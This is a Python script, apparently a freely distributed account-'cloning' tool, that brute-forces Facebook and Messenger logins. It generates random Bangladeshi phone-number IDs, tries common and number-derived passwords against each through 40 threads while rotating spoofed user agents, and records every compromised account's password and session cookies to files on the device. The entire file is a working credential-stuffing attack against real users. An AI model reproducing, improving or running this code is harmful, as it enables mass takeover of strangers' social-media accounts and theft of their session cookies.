import requests,sys,re,time,os,random,http,uuid,string,json,base64,platform
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
from requests.exceptions import ConnectionError


orange = "\033[38;5;196m"; yellow = "\033[38;5;208m"; black="\033[1;30m"; rad="\033[38;5;160m"; green="\033[38;5;46m"; yelloww="\033[1;33m"; blue="\033[38;5;6m"; purple="\033[1;35m"; cyan="\033[1;36m"; white="\033[1;37m"; faltu = "\033[1;47m"; pvt = "\033[1;0m"; gren = "\033[38;5;154m"; gas = "\033[1;32m"
red = "\033[38;5;160m"
MONTH_NAMES = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Augustus', 'September', 'October', 'November', 'December']
now = datetime.now()
day = now.day
month = MONTH_NAMES[now.month - 1]
today_date = f"{day}-{month}"

ugen=[]
ugen4=[]
for memk in range(10000):
    rr = random.randint; rc = random.choice
    gt = ['N4LEFH','TQ2A','QQ1B','PQ1A','SQ3A','RD1B','LDK2WU','SD2A','AB03E','Z367Q','R8638','C886H'] 
    strt = f'viabrowser;Safary-Mozilla/5.0 (Windows NT 10.0 .{str(rr(1,20))}; WOW64){str(rc(gt))})Applewebkit/537.36 (KHTML, like Gecko) Chrome/{str(rr(50,500))}.0.{str(rr(3990,5001))}.{str(rr(20,170))} Safari/537.36 Vivaldi/{str(rr(10,400))}.0.{str(rr(111,6666))}.{str(rr(10,400))}'
    ical4 = f"viabrowser;Safary-Mozilla/5.0 (Windows NT 10.0 .{str(rr(1,20))}; WOW64){str(rc(gt))})Applewebkit/537.36 (KHTML, like Gecko) Chrome/{str(rr(50,140))}.0.{str(rr(3990,5001))}.{str(rr(20,170))} Safari/537.36 Vivaldi/6.0.2979.18"
    fa5 = f'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'
    fan = f'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36'
    fina = f'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,300))}.0.0.0 Mobile Safari/537.36'
    uaku2 = random.choice([strt,ical4,fa5,fan,fina])
    ugen.append(uaku2)


for xd in range(10000):
    rr = random.randint
    build_b = random.choice(["001","002","003","011","012","014","015","020","021","022","023","024"])
    bl_typ = random.choice(["TKQ1","SKQ1","TP1A","RKQ1","SP1A","RP1A","PPR1","QP1A"])
    oppo = random.choice(["CPH2461","CPH2451","PCGM00","PBBM00","PFZM10","PGGM10","PECT30","PCHM10","PEAT00","PEYM00","PESM10","PFGM00"])
    infinix = random.choice(["Infinix X669C","Infinix X6823","Infinix X676C","Infinix X683","Infinix X689C","Infinix X6811","Infinix X612B","Infinix X6810","Infinix X665E"])
    redmi = random.choice(["2211133G","M2004J19C","22041219I","22101316UG","2209116AG","M2010J19SY","M2012K11C","Redmi Note 7","Redmi Note 8","Redmi Note 5"])
    um2 = f"Mozilla/5.0 (Linux; Android {str(rr(6,12))}; {oppo} Build/{bl_typ}.{str(rr(120000,220000))}.{build_b}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(80,114))}.0.{str(rr(4200,5400))}.{str(rr(70,150))} Mobile Safari/537.36"
    um1 = f"Mozilla/5.0 (Linux; Android {str(rr(6,12))}; {redmi} Build/{bl_typ}.{str(rr(120000,220000))}.{build_b}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(80,114))}.0.{str(rr(4200,5400))}.{str(rr(70,150))} Mobile Safari/537.36"
    um3 = f"Mozilla/5.0 (Linux; Android {str(rr(6,12))}; {infinix} Build/{bl_typ}.{str(rr(120000,220000))}.{build_b}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(80,114))}.0.{str(rr(4200,5400))}.{str(rr(70,150))} Mobile Safari/537.36"
    um4 = f"Mozilla/5.0 (Linux; Android {str(rr(6,12))}; {infinix}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,114))}.0.{str(rr(4900,5700))}.{str(rr(70,150))} Mobile Safari/537.36"
    ugen4 = random.choice([um1, um2, um3, um4])

def ____banner____():
    if "win" in sys.platform:os.system("cls")
    else:os.system("clear")
    print(f"""  \x1b[38;5;43m╔═╗╔═╗╦╦╔═╔═╗╔╦╗
  \x1b[38;5;42m╚═╗╠═╣║╠╩╗║╣  ║ 
  \x1b[38;5;40m╚═╝╩ ╩╩╩ ╩╚═╝ ╩ {green}V{white}/{green}ULTRA-007
{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 {rad}[{white}⁂{rad}] {green}DEVELOPER  {white}- {white}SAMIR AHMED SAIKET
 {rad}[{white}⁂{rad}] {green}FACEBOOK   {white}- {white}FAYSAL HABIBUR RAHMAN
 {rad}[{white}⁂{rad}] {green}TOOLTYPE   {white}- {white}FREE{rad}{green}┼{faltu}{rad}FILE & RANDOM{pvt}{green}{green}┼
 {rad}[{white}⁂{rad}] {green}GITHUB     {white}- github.com/TKS-07
{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")

def linex():
        print(f"{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

user = []
loop = 0
oks = []
cps = []

def RANDOM():
    user=[]
    ____banner____()
    code=input(f" {rad}[{white}⁂{rad}] {green}SIM CODES {rad}[{white}0171 0160 0182 0193{rad}]\n {rad}[{white}⁂{rad}] {green}SELECTION  {white}- {yelloww}"); linex()
    limit = int(input(f" {rad}[{white}⁂{rad}] {green}TOTAL ID {rad}[{white}10000 20000 30000{rad}]\n {rad}[{white}⁂{rad}] {green}SELECTION  {white}- {yelloww}")); linex()
    for nmbr in range (limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    method = input(
               f" {rad}[{white}A{rad}] {green}METHOD M1 {rad}({white}Robi/Airtel{rad})\n"
               f" {rad}[{white}B{rad}] {green}METHOD M2 {rad}({white}Gp/Bl{rad})\n"
               f"{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
               f" {rad}[{white}⁂{rad}] {green}SELECTION  {white}- {yelloww}")
    with ThreadPool(max_workers=40) as executor:
        ____banner____()
        tl = str(len(user))
        print(f' {rad}[{white}⁂{rad}] {green}SIM CODE{rad}┼{white}{code}{rad}┼{green}TOTAL IDS{rad}┼{white}{tl}')
        print(f' {rad}[{white}⁂{rad}] {green}IF NO RESULT [{white}On{orange}/{white}Off{green}] AIRPLANE MODE')
        linex()
        for love in user:
            uid = code + love
            passlist = [uid[-8:],uid[0:7],uid[-6:],uid[-7:],'0987654','203040','506070','607080','@1234@','@123456@','@@@###','@@@@####']
            if method in ["A", "a"]:
                executor.submit(A,uid,passlist,tl)
            elif method in ["B", "b"]:
                executor.submit(B,uid,passlist,tl)
    print('')
    linex()
    print(f" {rad}[{white}⁂{rad}] {green}PROCESS HAS BEEN COMPLETED")
    print(f" {rad}[{white}⁂{rad}] {green}TOTAL OKS{white}  - {green}{len(oks)}")  
    linex()
    exit()


def A(uid,passlist,tl):
    global loop,cps,oks
    sys.stdout.write(f"\r\r {red}[{green}{today_date}{red}]{white}-{red}[\x1b[38;5;38m{loop}{red}]{white}-{red}[{green}OK:{len(oks)}{red}]{white}-{red}[\x1b[38;5;38m{'{:.1%}'.format(loop/int(tl))}{red}]")
    sys.stdout.flush()
    session=requests.Session()
    while True:
        try:
            ua = random.choice(ugen)
            headers = {"Host": "www.messenger.com","Connection": "keep-alive","Content-Length": "267","Cache-Control": "max-age=0","sec-ch-ua": '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',"sec-ch-ua-mobile": "?0","sec-ch-ua-platform": '"Linux"',"Upgrade-Insecure-Requests": "1","Origin": "https://www.messenger.com","Content-Type": "application/x-www-form-urlencoded","User-Agent": ua,"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","Sec-Fetch-Site": "same-origin","Sec-Fetch-Mode": "navigate","Sec-Fetch-User": "?1","Sec-Fetch-Dest": "document","Referer": "https://www.messenger.com/","Accept-Encoding": "gzip, deflate, br","Accept-Language": "en-GB,en;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5",}
            reqs = session.get("https://www.messenger.com/").text
            datr = re.search('_js_datr","(.*?)",', str(reqs)).group(1)
            data = {"jazoest":re.search('name="jazoest" value="(.*?)"', str(reqs)).group(1),"lsd":re.search('name="lsd" value="(.*?)"', str(reqs)).group(1),"initial_request_id":re.search('name="initial_request_id" value="(.*?)"', str(reqs)).group(1),"timezone":"-300","lgndim":re.search('name="lgndim" value="(.*?)"', str(reqs)).group(1),"lgnrnd":re.search('name="lgnrnd" value="(.*?)"', str(reqs)).group(1),"lgnjs":"n","email":uid,"login":"1","default_persistent":""}
            headers.update({"Cookie":f"wd=980x1715; dpr=2; _js_datr={datr}"})
            break
        except Exception as e:pass
    for pas in passlist:
        try:
            data.update({"pass":"".join(pas)})
            response = session.post("https://www.messenger.com/login/password/", data=data, headers=headers)
            if "c_user" in session.cookies.get_dict():
                coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                xd = re.findall('c_user=(.*);xs', coki)[0]
                oks.append(uid)
                print(f"\r\r{rad} [{green}SAMIR-💸{rad}] {green}{xd}{white} -{green} {pas}")
                print(f"\r\r{green}=[🚬]={coki}")
                open("/sdcard/SAMIR-OK.txt","a").write(xd+"|"+pas+"|"+coki+"\n")
                break
            else:continue
        except (requests.exceptions.ConnectionError):
            time.sleep(5)
        except Exception as e:pass
    loop+=1


def B(uid,passlist,tl):
    global loop
    global cps    
    global oks
    sys.stdout.write(f"\r\r {red}[{green}{today_date}{red}]{white}-{red}[\x1b[38;5;38m{loop}{red}]{white}-{red}[{green}OK:{len(oks)}{red}]{white}-{red}[\x1b[38;5;38m{'{:.1%}'.format(loop/int(tl))}{red}]")
    sys.stdout.flush()
    ua = random.choice(ugen4)
    session = requests.Session()
    for pas in passlist:
        try:
            free_fb=session.get("https://mbasic.facebook.com/").text
            data={
"lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
"jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
"m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
"li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
"try_number":'0',
"unrecognized_tries":'0',
"email":uid,
"pass":pas}
            headers={
'Host': "mbasic.facebook.com",
'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
'Accept-Encoding':'gzip, deflate, br, zstd',
'Accept-Language':'en-US,en;q=0.9',
'Cache-Control':'max-age=0',
'Content-Type':'application/x-www-form-urlencoded',
'Origin':f'https://mbasic.facebook.com',
'Priority':'u=0, i',
'Referer':f'https://mbasic.facebook.com/login/',
'Sec-Ch-Ua':'"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
'Sec-Ch-Ua-Mobile':'?0',
'Sec-Fetch-Dest':'document',
'Sec-Fetch-Mode':'navigate',
'Sec-Fetch-Site':'same-origin',
'Sec-Fetch-User':'?1',
'Upgrade-Insecure-Requests':'1',
'User-Agent': ua}
            session.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8",data=data,headers=headers)
            res=session.cookies.get_dict().keys()
            if "c_user" in res:
                oks+=1
                coki = session.cookies.get_dict()
                cookie = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                print(f"\r\r{rad} [{green}SAMIR-💸{rad}] {green}{uid}{white} -{green} {pas}")
                print(f"\r\r{green}=[🚬]={cookie}")
                open('/sdcard/SAMIR-RN-M1.txt','a').write(uid+' | '+pas+'\n');open('/sdcard/SAMIR-RN-M1-COOKIE.txt','a').write(uid+' | '+pas+' | '+cookie+'\n')
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1

RANDOM()